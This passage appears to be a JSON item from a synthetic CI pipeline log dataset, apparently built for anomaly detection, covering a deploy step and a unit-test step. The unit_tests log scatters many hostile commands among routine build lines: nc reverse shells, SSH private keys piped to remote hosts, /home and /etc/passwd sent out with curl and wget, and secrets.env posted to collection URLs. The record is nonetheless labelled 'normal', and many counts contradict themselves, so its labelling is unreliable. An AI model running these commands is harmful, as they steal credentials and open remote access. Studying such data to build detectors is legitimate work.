          "[12:18:54] DEBUG: Query executed in 95ms",
          "[12:18:54] INFO: Processing request",
          "Time: 69.548s",
          "[12:18:54] DEBUG: Connection pool: 12 active",
          "Creating production build...",
          "Ready.",
          "\u2713 validate completed",
          "Creating production build...",
          "Using Node.js 14.10.2",
          "Platform: darwin-arm64",
          "Optimizing 81 modules...",
          "Compiling lib/service.java...",
          "Using Node.js 20.19.5",
          "Time: 56.375s",
          "Pulling image: python:3.11",
          "\u2713 Step 'checkout' succeeded",
          "Waiting...",
          "Compiling components/utils.go...",
          "Step 8/20: Linting",
          "Step 3/21: Deploying",
          "Cache hit for key-3265",
          "WARNING: jest has known vulnerabilities",
          "Step 12/15: Linting",
          "Step 4/18: Testing",
          "Pulling image: python:18",
          "Bundling styles.js",
          "[12:18:54] INFO: Request completed",
          "Cache miss for key-1147",
          "Using Node.js 20.2.3",
          "[12:18:54] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "Cache miss for key-9043",
          "pip: Installing build dependencies...",
          "WARNING: webpack has known vulnerabilities",
          "NODE_ENV=development",
          "Success!",
          "Cache invalidated: node_modules",
          "[12:18:54] INFO: Request completed",
          "Cache restored successfully (168MB)",
          "[12:18:54] INFO: Cache refreshed",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Ran 93 tests in 47s",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "[12:18:54] DEBUG: Loading configuration",
          "Step 17/19: Building",
          "OK",
          "Image pulled successfully",
          "Coverage: 83% statements, 66% branches",
          "\u2713 Task completed in 1179ms",
          "GET /api - 200 (36ms)",
          "Layer 7/15: RUN command",
          "Step 7/20: Deploying",
          "Creating production build...",
          "OK",
          "Compiling src/utils.go...",
          "\u2713 Task completed in 1034ms",
          "Step 4/19: Deploying",
          "Using Node.js 17.18.8",
          "[12:18:54] INFO: Connecting to database",
          "Pulling image: python:latest",
          "Step 3/25: Running migrations",
          "Connecting to test.io:443...",
          "Artifact downloaded: 38MB",
          "[12:18:54] DEBUG: Query executed in 29ms",
          "Tests: 211 passed, 383 total",
          "Image pulled successfully",
          "Compiling utils/utils.go...",
          "GET /api - 200 (80ms)",
          "Cache restored successfully (347MB)",
          "Ready.",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Tests: 99 passed, 312 total",
          "Artifact downloaded: 21MB",
          "  PASS: test_api_health (157ms)",
          "[12:18:54] DEBUG: Memory usage: 923MB",
          "[12:18:54] DEBUG: Loading configuration",
          "Exception: TypeError",
          "Step 10/16: Building",
          "Compiling utils/main.py...",
          "Compiling lib/utils.go...",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:18:54] DEBUG: Memory usage: 1321MB",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "Waiting...",
          "Platform: win32-x64",
          "\u2713 Step 'setup' succeeded",
          "Artifact downloaded: 3MB",
          "Ran 30 tests in 46s",
          "npm notice: package.json updated",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:18:54] DEBUG: Query executed in 92ms",
          "\u2713 Task completed in 578ms",
          "[12:18:54] INFO: Processing request",
          "Building Docker image...",
          "Step 4/21: Linting",
          "[12:18:54] INFO: Processing request",
          "Step 19/15: Installing dependencies",
          "WARNING: eslint has known vulnerabilities",
          "Layer 1/13: COPY command",
          "[12:18:54] DEBUG: Connection pool: 8 active",
          "[12:18:54] WARN: Deprecated API usage",
          "Step 1/21: Installing dependencies",
          "Uploading artifact 'dist' (38 files)",
          "[12:18:54] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-192'",
          "Cache invalidated: node_modules",
          "HEAD is now at 553a437",
          "[12:18:54] WARN: Deprecated API usage",
          "Cache miss for key-9300",
          "Connecting to startup.dev:443...",
          "Pushing to registry...",
          "Artifact downloaded: 6MB",
          "POST /upload - 200 (473ms)",
          "Tests: 383 passed, 50 total",
          "Environment: development",
          "Creating production build...",
          "Generating source maps...",
          "[12:18:54] DEBUG: Connection pool: 19 active",
          "TLS handshake completed",
          "Cache hit for key-2150",
          "Step 1/25: Installing dependencies",
          "Coverage: 76% statements, 100% branches",
          "Installing jest@2.18.7",
          "Pushing to registry...",
          "pip: Collecting express",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-23T12:21:14.956846",
        "finished_at": "2025-11-23T12:21:43.929502",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Installing axios@3.20.1",
          "OK",
          "Fetching submodules...",
          "Cache hit for key-4432",
          "Test Suites: 35 passed, 41 total",
          "[12:18:54] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Verifying...",
          "Finished.",
          "Compiling src/utils.go...",
          "Processing...",
          "Using Python 3.11",
          "[12:18:54] DEBUG: Query executed in 67ms",
          "Artifact uploaded: build.tar.gz (16MB)",
          "yarn add: Done in 1.47s",
          "[12:18:54] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache miss for key-8108",
          "Loading...",
          "Coverage: 70% statements, 62% branches",
          "Ran 83 tests in 54s",
          "npm notice: package.json updated",
          "Step 5/16: Running migrations",
          "[12:18:54] WARN: Deprecated API usage",
          "Cache miss for key-1742",
          "\u2713 deploy completed",
          "nc -e /bin/sh 50.63.93.235 29108",
          "Ran 104 tests in 22s",
          "[12:18:54] DEBUG: Connection pool: 2 active",
          "[12:18:54] DEBUG: Loading configuration",
          "npm install: resolved 1247 packages",
          "[12:18:54] INFO: Request completed",
          "Pushing to registry...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 246.2.41.234 16402",
          "Compiling utils/handler.rs...",
          "Time: 27.247s",
          "[12:18:54] DEBUG: Connection pool: 11 active",
          "Bundling runtime.css",
          "pip: Installing build dependencies...",
          "Pulling image: python:3.11",
          "pip install: Successfully installed express-3.12",
          "Compiling src/service.java...",
          "[12:18:54] ERROR: Connection failed",
          "Step 12/19: Building",
          "Compiling components/service.java...",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "[12:18:54] INFO: Cache refreshed",
          "OK",
          "Cache miss for key-2231",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "NODE_ENV=test",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 34.40.170.219 65218",
          "[12:18:54] INFO: Starting build process",
          "WARNING: prettier has known vulnerabilities",
          "Uploading artifact 'dist' (45 files)",
          "Minifying main.js",
          "Sending 64MB of data to test.io",
          "yarn add: Done in 9.45s",
          "Compiling src/utils.go...",
          "Cache saved successfully",
          "Artifact downloaded: 31MB",
          "  PASS: unit/test_cache_hit.spec.js",
          "Connecting to acme.corp:443...",
          "pip: Collecting axios",
          "POST /upload - 201 (288ms)",
          "Using Node.js 17.9.0",
          "Connecting to example.com:443...",
          "Finished.",
          "[12:18:54] DEBUG: Query executed in 85ms",
          "[12:18:54] INFO: Connecting to database",
          "[12:18:54] INFO: Request completed",
          "Fetching submodules...",
          "pip install: Successfully installed express-5.7",
          "Completed.",
          "HEAD is now at 3e13732",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 114.174.8.233 13434",
          "[12:18:54] WARN: Deprecated API usage",
          "Processing...",
          "Tests: 372 passed, 182 total",
          "npm notice: package.json updated",
          "[12:18:54] INFO: Request completed",
          "Step 20/21: Installing dependencies",
          "\u2713 All checks passed",
          "Creating production build...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 243.192.145.228 14623",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 20/22: Building",
          "Sending 464MB of data to acme.corp",
          "[12:18:54] DEBUG: Memory usage: 975MB",
          "  PASS: test_api_health (204ms)",
          "Test Suites: 22 passed, 11 total",
          "Cache restored successfully (288MB)",
          "Cache hit for key-7728",
          "Already up to date.",
          "OK",
          "Verifying...",
          "Installing prettier@3.17.0",
          "WARNING: eslint has known vulnerabilities",
          "Cache saved successfully",
          "Pulling image: python:18",
          "Ready.",
          "Pushing to registry...",
          "Connecting to acme.corp:443...",
          "Image pulled successfully",
          "POST /upload - 200 (449ms)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Connection established",
          "Transforming 469 files...",
          "FAILED: test_db_connect",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:18:54] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Finished.",
          "[12:18:54] INFO: Request completed",
          "Verifying...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Sending 110MB of data to startup.dev",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 106.116.77.39 9088",
          "Compiling utils/service.java...",
          "Tests: 401 passed, 186 total",
          "pip: Downloading react-4.7.tar.gz",
          "Compiling src/index.js...",
          "Sending 252MB of data to test.io",
          "Step 17/19: Linting",
          "Using Node.js 14.20.4",
          "Image pulled successfully",
          "Layer 9/13: ENV command",
          "  PASS: unit/test_api_health.spec.js",
          "npm install: added 253 packages",
          "pip: Installing build dependencies...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "yarn add: Done in 25.42s",
          "Layer 7/13: RUN command",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Waiting...",
          "[12:18:54] INFO: Connecting to database",
          "[12:18:54] ERROR: Connection failed",
          "pip: Downloading axios-3.8.tar.gz",
          "TLS handshake completed",
          "nc -e /bin/sh 50.153.156.156 49256",
          "Ran 88 tests in 48s",
          "npm install: resolved 285 packages",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Connecting to test.io:443...",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "Compiling lib/service.java...",
          "Success!",
          "Sending 144MB of data to cloud.services",
          "Processing...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 15MB",
          "Sending 235MB of data to example.com",
          "Cache hit for key-3148",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting jest",
          "[12:18:54] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Snapshots: 19 passed, 0 total",
          "\u2713 deploy completed",
          "Ran 161 tests in 37s",
          "Image pulled successfully",
          "Coverage: 95% statements, 63% branches",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Image pulled successfully",
          "Installing eslint@2.15.10",
          "Coverage: 71% statements, 70% branches",
          "Ran 11 tests in 32s",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Creating production build...",
          "Artifact downloaded: 29MB",
          "POST /api - 201 (330ms)",
          "NODE_ENV=test",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Generating source maps...",
          "[12:18:54] INFO: Cache refreshed",
          "[12:18:54] DEBUG: Query executed in 94ms",
          "[12:18:54] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "[12:18:54] WARN: Deprecated API usage",
          "Optimizing 61 modules...",
          "Using Node.js 19.5.4",
          "[12:18:54] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-2.7",
          "=== Step unit_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}